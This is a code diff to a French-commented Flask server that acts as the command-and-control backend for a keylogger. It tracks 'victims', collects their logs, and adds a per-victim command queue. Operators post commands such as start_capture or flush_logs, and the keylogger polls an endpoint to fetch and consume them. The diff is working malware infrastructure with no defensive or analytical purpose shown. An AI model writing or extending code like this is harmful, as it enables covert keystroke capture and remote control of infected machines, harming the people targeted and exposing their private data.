@@ -17,6 +17,7 @@ CORS(app)  # Permet les requêtes cross-origin
 
 storage = LogStorage()
 active_victims = {}  # {victim_id: last_seen_timestamp}
+pending_commands = {}  # {victim_id: [command1, command2, ...]}
 
 
 @app.route('/logs', methods=['POST'])
@@ -99,11 +100,57 @@ def analyze_victim(victim_id):
 @app.route('/command', methods=['POST'])
 def receive_command():
     """
-    Reçoit une commande pour une victime (pour communication bidirectionnelle future)
+    Reçoit une commande pour une victime et la stocke en attente
     """
-    data = request.json
-    # Cette fonctionnalité peut être étendue pour envoyer des commandes aux victimes
-    return jsonify({"status": "received"}), 200
+    try:
+        data = request.json
+        
+        if not data or 'victim_id' not in data or 'command' not in data:
+            return jsonify({"error": "Données invalides"}), 400
+        
+        victim_id = data['victim_id']
+        command = data['command']
+        params = data.get('params', {})
+        
+        # Valider la commande
+        valid_commands = ['start_capture', 'stop_capture', 'switch_mode', 'flush_logs']
+        if command not in valid_commands:
+            return jsonify({"error": f"Commande invalide. Commandes valides: {valid_commands}"}), 400
+        
+        # Ajouter la commande à la queue
+        if victim_id not in pending_commands:
+            pending_commands[victim_id] = []
+        
+        pending_commands[victim_id].append({
+            "command": command,
+            "params": params,
+            "timestamp": datetime.now().isoformat()
+        })
+        
+        print(f"[+] Commande '{command}' ajoutée pour {victim_id}")
+        return jsonify({"status": "success", "message": f"Commande '{command}' en attente"}), 200
+    
+    except Exception as e:
+        print(f"[-] Erreur lors de la réception de commande: {e}")
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/victims/<victim_id>/commands', methods=['GET'])
+def get_commands(victim_id):
+    """
+    Récupère les commandes en attente pour une victime
+    Le keylogger appelle cet endpoint périodiquement
+    """
+    if victim_id not in pending_commands:
+        return jsonify({"commands": []}), 200
+    
+    # Récupérer toutes les commandes en attente
+    commands = pending_commands[victim_id].copy()
+    
+    # Vider la queue (les commandes sont consommées)
+    pending_commands[victim_id] = []
+    
+    return jsonify({"commands": commands}), 200
 
 
 @app.route('/')
